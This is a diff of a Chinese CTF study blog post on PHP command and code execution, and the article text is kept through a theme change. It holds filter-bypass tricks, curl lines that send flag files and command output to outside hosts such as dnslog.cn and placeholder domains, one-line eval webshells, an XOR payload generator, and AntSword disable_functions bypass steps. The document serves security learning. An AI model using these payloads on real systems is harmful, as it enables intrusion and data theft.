@@ -1,79 +1,260 @@
-
 <!DOCTYPE html>
-<html lang="en" class="loading">
+<html lang="en">
 <head>
-    <meta charset="UTF-8" />
-    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
-    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Web_2_PHP命令执行+代码执行 - Charmersix</title>
-    <meta name="apple-mobile-web-app-capable" content="yes" />
-    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <meta name="google" content="notranslate" />
-    <meta name="keywords" content="Fechin,"> 
-    <meta name="description" content="第一节 php的基础知识0x1 php的基本概念php是网站的一种脚本语言，文件后缀是php，用来写网站，适合中小型网站的开发。
-0x2 php环境的安装php 的运行环境phpstudy
-php ,"> 
-    <meta name="author" content="John Doe"> 
-    <link rel="alternative" href="atom.xml" title="Charmersix" type="application/atom+xml"> 
-    <link rel="icon" href="/img/favicon.png"> 
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Keep">
+    <meta name="description" content="Hexo Theme Keep">
+    <meta name="author" content="Charmersix">
     
-<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+    <title>
+        
+            Web_2_PHP命令执行+代码执行 |
+        
+        Charmersix&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
 
-    
-    
-    <meta name="twitter:card" content="summary"/>
-    <meta name="twitter:title" content="Web_2_PHP命令执行+代码执行 - Charmersix"/>
-    <meta name="twitter:description" content="第一节 php的基础知识0x1 php的基本概念php是网站的一种脚本语言，文件后缀是php，用来写网站，适合中小型网站的开发。
-0x2 php环境的安装php 的运行环境phpstudy
-php ,"/>
-    
-    
-    
-    
-    <meta property="og:site_name" content="Charmersix"/>
-    <meta property="og:type" content="object"/>
-    <meta property="og:title" content="Web_2_PHP命令执行+代码执行 - Charmersix"/>
-    <meta property="og:description" content="第一节 php的基础知识0x1 php的基本概念php是网站的一种脚本语言，文件后缀是php，用来写网站，适合中小型网站的开发。
-0x2 php环境的安装php 的运行环境phpstudy
-php ,"/>
-    
-<link rel="stylesheet" href="/css/diaspora.css">
-
+    <link rel="shortcut icon" href="/images/head.png">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/fontawesome.min.css">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/regular.min.css">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/solid.min.css">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/brands.min.css">
+    <script id="hexo-configurations">
+    let KEEP = window.KEEP || {}
+    KEEP.hexo_config = {"hostname":"charmersix.icu","root":"/","language":"en","path":"search.json"}
+    KEEP.theme_config = {"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true},"style":{"primary_color":"#0066cc","logo":"/images/logo.png","favicon":"/images/head.png","avatar":"/images/ta.jpg","font_size":null,"font_family":null,"hover":{"shadow":true,"scale":false},"first_screen":{"enable":true,"header_transparent":true,"background_img":"/images/bg.svg","description":"Keep writing and Keep loving.","font_color":null,"hitokoto":true},"scroll":{"progress_bar":true,"percent":true}},"local_search":{"enable":true,"preload":true},"code_copy":{},"code_block":{"tools":{"enable":true,"style":"mac"},"highlight_theme":"obsidian"},"side_tools":{},"pjax":{"enable":true},"lazyload":{"enable":true},"comment":{"enable":true,"use":"waline","valine":{"appid":null,"appkey":null,"server_urls":null,"placeholder":null},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.8"},"waline":{"server_url":"https://lsvf4zhg.api.lncldglobal.com","reaction":true,"version":2}},"post":{"author_label":{"enable":false,"auto":false,"custom_label_list":["CTFer"]},"word_count":{"enable":true,"wordcount":true,"min2read":true},"img_align":"left","copyright_info":false},"version":"3.6.1"}
+    KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"}
+    KEEP.language_code_block = {"copy":"Copy code","copied":"Copied","fold":"Fold code block","folded":"Folded"}
+    KEEP.language_copy_copyright = {"copy":"Copy copyright info","copied":"Copied","title":"Original article title","author":"Original article author","link":"Original article link"}
+  </script>
 <meta name="generator" content="Hexo 5.4.2"></head>
 
-<body class="loading">
-    <span id="config-title" style="display:none">Charmersix</span>
-    <div id="loader"></div>
-    <div id="single">
-    <div id="top" style="display: block;">
-    <div class="bar" style="width: 0;"></div>
-    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://charmersix.icu"></a>
-    <div title="播放/暂停" class="iconfont icon-play"></div>
-    <h3 class="subtitle">Web_2_PHP命令执行+代码执行</h3>
-    <div class="social">
-        <div>
-            <div class="share">
-                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
-            </div>
-            <div id="qr"></div>
-        </div>
-    </div>
-    <div class="scrollbar"></div>
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <i class="pjax-progress-icon fas fa-circle-notch fa-spin"></i>
+    
 </div>
 
-    <div class="section">
-        <div class="article">
-    <div class='main'>
-        <h1 class="title">Web_2_PHP命令执行+代码执行</h1>
-        <div class="stuff">
-            <span>九月 07, 2022</span>
+
+<main class="page-container">
+
+    
+
+    <div class="page-main-content">
+
+        <div class="page-main-content-top">
             
-  <ul class="post-tags-list" itemprop="keywords"><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/PHP/" rel="tag">PHP</a></li><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/Study/" rel="tag">Study</a></li><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/Web/" rel="tag">Web</a></li></ul>
+<header class="header-wrapper">
+
+    <div class="header-content">
+        <div class="left">
+            
+                <a class="logo-image" href="/">
+                    <img src="/images/logo.png">
+                </a>
+            
+            <a class="logo-title" href="/">
+               Charmersix&#39;s Blog
+            </a>
+        </div>
+
+        <div class="right">
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/"
+                            >
+                                HOME
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/archives"
+                            >
+                                ARCHIVES
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/tags"
+                            >
+                                TAGS
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/link"
+                            >
+                                LINKS
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/about"
+                            >
+                                ABOUT
+                            </a>
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="fas fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/">HOME</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/archives">ARCHIVES</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/tags">TAGS</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/link">LINKS</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/about">ABOUT</a>
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
 
 
         </div>
-        <div class="content markdown">
-            <h2 id="第一节-php的基础知识"><a href="#第一节-php的基础知识" class="headerlink" title="第一节 php的基础知识"></a>第一节 php的基础知识</h2><h3 id="0x1-php的基本概念"><a href="#0x1-php的基本概念" class="headerlink" title="0x1 php的基本概念"></a>0x1 php的基本概念</h3><p>php是网站的一种脚本语言，文件后缀是php，用来写网站，适合中小型网站的开发。</p>
+
+        <div class="page-main-content-middle">
+
+            <div class="main-content">
+
+                
+                    <div class="fade-in-down-animation">
+    <div class="post-page-container">
+        <div class="article-content-container">
+
+            <div class="article-title">
+                <span class="title-hover-animation">Web_2_PHP命令执行+代码执行</span>
+            </div>
+
+            
+                <div class="article-header">
+                    <div class="avatar">
+                        <img src="/images/ta.jpg">
+                    </div>
+                    <div class="info">
+                        <div class="author">
+                            <span class="name">Charmersix</span>
+                            
+                        </div>
+                        <div class="meta-info">
+                            
+<div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        
+            <i class="fa-regular fa-calendar-plus"></i>&nbsp;
+        
+        <span class="pc">2022-09-07 00:00:00</span>
+        <span class="mobile">2022-09-07 00:00</span>
+    </span>
+    
+        <span class="article-update-date article-meta-item">
+        <i class="fas fa-file-pen"></i>&nbsp;
+        <span class="pc">2023-04-09 16:38:46</span>
+    </span>
+    
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fas fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/Web/">Web</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/Study/">Study</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/PHP/">PHP</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+        <span class="article-wordcount article-meta-item">
+            <i class="fas fa-file-word"></i>&nbsp;<span>2.6k Words</span>
+        </span>
+    
+    
+        <span class="article-min2read article-meta-item">
+            <i class="fas fa-clock"></i>&nbsp;<span>11 Mins</span>
+        </span>
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                        </div>
+                    </div>
+                </div>
+            
+
+            <div class="article-content keep-markdown-body">
+                
+
+                <h2 id="第一节-php的基础知识"><a href="#第一节-php的基础知识" class="headerlink" title="第一节 php的基础知识"></a>第一节 php的基础知识</h2><h3 id="0x1-php的基本概念"><a href="#0x1-php的基本概念" class="headerlink" title="0x1 php的基本概念"></a>0x1 php的基本概念</h3><p>php是网站的一种脚本语言，文件后缀是php，用来写网站，适合中小型网站的开发。</p>
 <h3 id="0x2-php环境的安装"><a href="#0x2-php环境的安装" class="headerlink" title="0x2 php环境的安装"></a>0x2 php环境的安装</h3><h4 id="php-的运行环境"><a href="#php-的运行环境" class="headerlink" title="php 的运行环境"></a>php 的运行环境</h4><p>phpstudy</p>
 <h4 id="php-的开发环境"><a href="#php-的开发环境" class="headerlink" title="php 的开发环境"></a>php 的开发环境</h4><p>? 区分文件和参数部分</p>
 <p>参数部分 用 &amp; 区分 多个键值对</p>
@@ -117,7 +298,12 @@ php ,"/>
 <h5 id="变量拼接绕过关键字"><a href="#变量拼接绕过关键字" class="headerlink" title="变量拼接绕过关键字"></a>变量拼接绕过关键字</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=c;b=at;c=fla;d=g.php;$a$b $&#123;c&#125;$&#123;d&#125;</span><br></pre></td></tr></table></figure>
 
 <h5 id="爆破被过滤的符号"><a href="#爆破被过滤的符号" class="headerlink" title="爆破被过滤的符号"></a>爆破被过滤的符号</h5><p>符号被过滤可以爆破一下，</p>
-<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209032135840.png" alt="image-20220903213502790" style="zoom: 67%;" />
+<img  
+                     lazyload
+                     alt="image"
+                     data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209032135840.png"
+                      alt="image-20220903213502790" style="zoom: 67%;" 
+                >
 
 <p>可以使用{}和冒号: 截取空格</p>
 <p>使用env浏览环境变量，然后截取</p>
@@ -125,17 +311,17 @@ php ,"/>
 <p><code>cmd=tac$&#123;GPG_KEYS:40:1&#125;*</code></p>
 <h4 id="不回显"><a href="#不回显" class="headerlink" title="不回显"></a>不回显</h4><p>没办法直接看到回显，可以使用写文件的方式，将结果写到浏览器可以读取的位置，然后访问url+1.txt</p>
 <h5 id="写入文件"><a href="#写入文件" class="headerlink" title="写入文件"></a>写入文件</h5><p>可以用 <code>&gt;</code> 写入</p>
-<h5 id="dns通道"><a href="#dns通道" class="headerlink" title="dns通道"></a>dns通道</h5><p><a target="_blank" rel="noopener" href="http://www.dnslog.cn/">http://www.dnslog.cn/</a></p>
+<h5 id="dns通道"><a href="#dns通道" class="headerlink" title="dns通道"></a>dns通道</h5><p><a class="link"   target="_blank" rel="noopener" href="http://www.dnslog.cn/" >http://www.dnslog.cn/<i class="fas fa-external-link-alt"></i></a></p>
 <p>当文件过长无法全部回带时，可以部分回带，使用sed -n命令</p>
 <p>可以使用</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=`sed -n &quot;3,4p&quot; fla?.php|base64`;curl $&#123;a:0:10&#125;.dnslog.cn #a中，从0开始截取10个，然后从10再截取，依此类推</span><br></pre></td></tr></table></figure>
 
 <p>当dnslog被过滤时，可以使用</p>
-<p><a target="_blank" rel="noopener" href="https://requestrepo.com/#/">https://requestrepo.com/#/</a></p>
-<p><a target="_blank" rel="noopener" href="https://pipedream.com/">https://pipedream.com/</a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://requestrepo.com/#/" >https://requestrepo.com/#/<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://pipedream.com/" >https://pipedream.com/<i class="fas fa-external-link-alt"></i></a></p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST --data a=`cat ./flag.php` http:/xxxx.com #POST</span><br><span class="line">curl http://xxx.com/?a=`whoami` #GET</span><br></pre></td></tr></table></figure>
 
-<h5 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h5><p>以及ctfshow专用反弹shell<a target="_blank" rel="noopener" href="https://your-shell.com/">https://your-shell.com/</a></p>
+<h5 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h5><p>以及ctfshow专用反弹shell<a class="link"   target="_blank" rel="noopener" href="https://your-shell.com/" >https://your-shell.com/<i class="fas fa-external-link-alt"></i></a></p>
 <h5 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h5><p>盲注猜flag</p>
 <h2 id="第三节-php的代码执行"><a href="#第三节-php的代码执行" class="headerlink" title="第三节 php的代码执行"></a>第三节 php的代码执行</h2><h3 id="0x1-什么是php的代码执行"><a href="#0x1-什么是php的代码执行" class="headerlink" title="0x1 什么是php的代码执行"></a>0x1 什么是php的代码执行</h3><p><code>eval(&quot;要执行的代码&quot;);</code> 可以执行参数给的php代码</p>
 <p>可以用?&gt;结束php代码。</p>
@@ -158,7 +344,12 @@ php ,"/>
 <p>get转post转接头</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">?<span class="number">1</span>=<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">2</span>]);</span><br></pre></td></tr></table></figure>
 
-<h3 id="0x5-代码执行的类型"><a href="#0x5-代码执行的类型" class="headerlink" title="0x5 代码执行的类型"></a>0x5 代码执行的类型</h3><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209052051444.png" alt="image-20220905205127371"></p>
+<h3 id="0x5-代码执行的类型"><a href="#0x5-代码执行的类型" class="headerlink" title="0x5 代码执行的类型"></a>0x5 代码执行的类型</h3><p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209052051444.png"
+                      alt="image-20220905205127371"
+                ></p>
 <p><code>(&quot;sys&quot;.&quot;tem&quot;)=system</code></p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">&quot;php&quot;</span>&gt;</span><span class="language-javascript"><span class="built_in">eval</span>($_POST[<span class="number">1</span>])</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> </span><br></pre></td></tr></table></figure>
 
@@ -178,12 +369,27 @@ php ,"/>
 <p>这里我们把upload.html挂到PHP study</p>
 <p>然后随便传一个.txt</p>
 <p>打开bp，开抓</p>
-<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209071106066.png" alt="image-20220907110602945"></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209071106066.png"
+                      alt="image-20220907110602945"
+                ></p>
 <p>我们发到repeater</p>
 <p>然后把我们1.txt文件中的内容改成要执行的命令，发包!</p>
-<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209071111453.png" alt="image-20220907111148387"></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209071111453.png"
+                      alt="image-20220907111148387"
+                ></p>
 <p>成功，如果不成功可以多发几次，因为我们匹配的文件名是未知的，能否正确匹配也是概率事件，多发几次就会成功。</p>
-<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209071114216.png" alt="image-20220907111400146"></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209071114216.png"
+                      alt="image-20220907111400146"
+                ></p>
 <h4 id="2-无字母数字代码执行"><a href="#2-无字母数字代码执行" class="headerlink" title="2.无字母数字代码执行"></a>2.无字母数字代码执行</h4><p>这里我们有两个脚本</p>
 <p>作者都来自羽师傅</p>
 <p>首先是一个php</p>
@@ -194,34 +400,84 @@ php ,"/>
 <figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># author yu22x</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">action</span>(<span class="params">arg</span>):</span><br><span class="line">   s1=<span class="string">&quot;&quot;</span></span><br><span class="line">   s2=<span class="string">&quot;&quot;</span></span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> arg:</span><br><span class="line">       f=<span class="built_in">open</span>(<span class="string">&quot;xor_rce.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">       <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">           t=f.readline()</span><br><span class="line">           <span class="keyword">if</span> t==<span class="string">&quot;&quot;</span>:</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">           <span class="keyword">if</span> t[<span class="number">0</span>]==i:</span><br><span class="line">               <span class="comment">#print(i)</span></span><br><span class="line">               s1+=t[<span class="number">2</span>:<span class="number">5</span>]</span><br><span class="line">               s2+=t[<span class="number">6</span>:<span class="number">9</span>]</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">       f.close()</span><br><span class="line">   output=<span class="string">&quot;(\&quot;&quot;</span>+s1+<span class="string">&quot;\&quot;^\&quot;&quot;</span>+s2+<span class="string">&quot;\&quot;)&quot;</span></span><br><span class="line">   <span class="keyword">return</span>(output)</span><br><span class="line">   </span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">   param=action(<span class="built_in">input</span>(<span class="string">&quot;\n[+] your function：&quot;</span>) )+action(<span class="built_in">input</span>(<span class="string">&quot;[+] your command：&quot;</span>))+<span class="string">&quot;;&quot;</span></span><br><span class="line">   <span class="built_in">print</span>(param)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 <p>我们跑一下，在<code>function：</code>和<code>command：</code>下分别填入我们想要执行的命令</p>
-<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209071133034.png" alt="image-20220907113334808"></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209071133034.png"
+                      alt="image-20220907113334808"
+                ></p>
 <p>然后就会生成一串异或出来的命令，复制执行即可</p>
 <p>这里的<code>(&quot;%08%02%08%08%05%0d&quot;^&quot;%7b%7b%7b%7c%60%60&quot;)(&quot;%08%08%0f%01%0d%09&quot;^&quot;%7f%60%60%60%60%60&quot;);</code></p>
 <p>虽然看上去存在一些数字字母，但是都是url编码后的，我们可以解码看一下</p>
-<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209071137175.png" alt="image-20220907113751127" style="zoom:50%;" />
+<img  
+                     lazyload
+                     alt="image"
+                     data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209071137175.png"
+                      alt="image-20220907113751127" style="zoom:50%;" 
+                >
 
 <p>是一些不可见字符昂</p>
 <h4 id="3-巧用蚁剑插件当脚本小子"><a href="#3-巧用蚁剑插件当脚本小子" class="headerlink" title="3.巧用蚁剑插件当脚本小子"></a>3.巧用蚁剑插件当脚本小子</h4><p>在这开始我们要准备一个比较新的中国蚁剑，不要像我一样，打开2016版的蚁剑</p>
-<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209071659033.png" alt="image-20220907165937928"></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209071659033.png"
+                      alt="image-20220907165937928"
+                ></p>
 <p>打开2019版的蚁剑，至少插件商城能用</p>
 <p>装几个插件，这是比较有用的几个，当然根据自己需求在商城里随便装</p>
-<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209071701964.png" alt="image-20220907170134913"></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209071701964.png"
+                      alt="image-20220907170134913"
+                ></p>
 <p>这里我们不再赘述一句话木马的上传，这时候我们一句话已经连上了，但是无论是读取flag，还是命令执行都没用</p>
 <p>然后，来到上传后的提权/绕过操作</p>
 <p>加载disable_functions,选择第一个LD_PRELOAD，开始</p>
-<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209071717134.png" alt="image-20220907171716075"></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209071717134.png"
+                      alt="image-20220907171716075"
+                ></p>
 <p>能看到当前目录下生成了一个<code>.antproxy.php</code></p>
-<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209071722782.png" alt="image-20220907172202728"></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209071722782.png"
+                      alt="image-20220907172202728"
+                ></p>
 <p>我们直接连这个文件</p>
-<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209071722408.png" alt="image-20220907172258368"></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209071722408.png"
+                      alt="image-20220907172258368"
+                ></p>
 <p>这时候我们回到终端<code>whoami</code></p>
-<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209071726093.png" alt="image-20220907172642064" style="zoom: 80%;" />
+<img  
+                     lazyload
+                     alt="image"
+                     data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209071726093.png"
+                      alt="image-20220907172642064" style="zoom: 80%;" 
+                >
 
 <p>注意这里不要打成<code>who m ai 👴！</code></p>
-<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209071727973.png" alt="image-20220907172723929" style="zoom:67%;" />
+<img  
+                     lazyload
+                     alt="image"
+                     data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209071727973.png"
+                      alt="image-20220907172723929" style="zoom:67%;" 
+                >
 
 <p>然后我们cat试试</p>
-<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209071728837.png" alt="image-20220907172800805"></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209071728837.png"
+                      alt="image-20220907172800805"
+                ></p>
 <p>没有权限，看来www-data权限还不够，会不会有其他命令，不用root权限，却能代替cat</p>
 <p>这里来一些Linux知识</p>
 <blockquote>
@@ -243,130 +499,372 @@ php ,"/>
 <p>-a    显示指定路径中的所有文件，包括隐藏文件<br>-l    显示文件的详细信息，包括文件类型，权限，所属用户，所属用户组，文件大小，上一次修改时间等<br>-h    文件大小以KBytes为单位显示<br>-S    按照文件大小顺序显示，默认从大到小；若要从小到大，可使用-Sr</p>
 </blockquote>
 <p>我们 <code>ls -al /usr/bin</code>发现（这里是fuzz的，其他题也行需要<code>ls -al</code> 其他文件夹，甚至可以<code>ls -al /*/*</code>）</p>
-<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209071734337.png" alt="image-20220907173454307"></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209071734337.png"
+                      alt="image-20220907173454307"
+                ></p>
 <p>这里的<code>-rwsr-sr-x</code></p>
 <blockquote>
 <p>第一个s代表的是suid：<br>他表示当其他的用户执行此命令时，可以取得和此文件的所有者一样的权限来取得系统资源<br>第而个s代表的是sgid：<br>他表示当其他的用户执行此命令时，可以取得和此文件的属组一样的权限来取得系统资源</p>
 </blockquote>
 <p>总之，<code>tac</code> 可用</p>
-<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209071741558.png" alt="image-20220907174119532"></p>
-<h4 id="4-蚁剑操作数据库"><a href="#4-蚁剑操作数据库" class="headerlink" title="4.蚁剑操作数据库"></a>4.蚁剑操作数据库</h4><p>有时候我们蚁剑连上服务器之后, 会发现服务器目录里没有我们想要的数据, 但是网站却有数据库连接, 这时候我们就可以尝试用蚁剑操作数据库<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303121827489.png" alt="image-20230312182700393"></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209071741558.png"
+                      alt="image-20220907174119532"
+                ></p>
+<h4 id="4-蚁剑操作数据库"><a href="#4-蚁剑操作数据库" class="headerlink" title="4.蚁剑操作数据库"></a>4.蚁剑操作数据库</h4><p>有时候我们蚁剑连上服务器之后, 会发现服务器目录里没有我们想要的数据, 但是网站却有数据库连接, 这时候我们就可以尝试用蚁剑操作数据库<img  
+                     lazyload
+                     alt="image"
+                     data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303121827489.png"
+                      alt="image-20230312182700393"
+                ></p>
 <p>然后我们点击添加, 选择好数据库类型, 以及密码就可以连接</p>
-<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303121829427.png" alt="image-20230312182914367"></p>
-<p>连接后, 我们根据提示, 执行SQL语句就可以拿到flag<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303121830528.png" alt="image-20230312183027472"></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303121829427.png"
+                      alt="image-20230312182914367"
+                ></p>
+<p>连接后, 我们根据提示, 执行SQL语句就可以拿到flag<img  
+                     lazyload
+                     alt="image"
+                     data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303121830528.png"
+                      alt="image-20230312183027472"
+                ></p>
 
-            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
-            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
-                <source type="audio/mpeg" src="">
-            </audio>
+            </div>
+
             
-                <ul id="audio-list" style="display:none">
+
+            
+                <ul class="post-tags-box">
                     
-                        
-                            <li title="0" data-url="http://link.hhtjim.com/163/425570952.mp3"></li>
-                        
+                        <li class="tag-item">
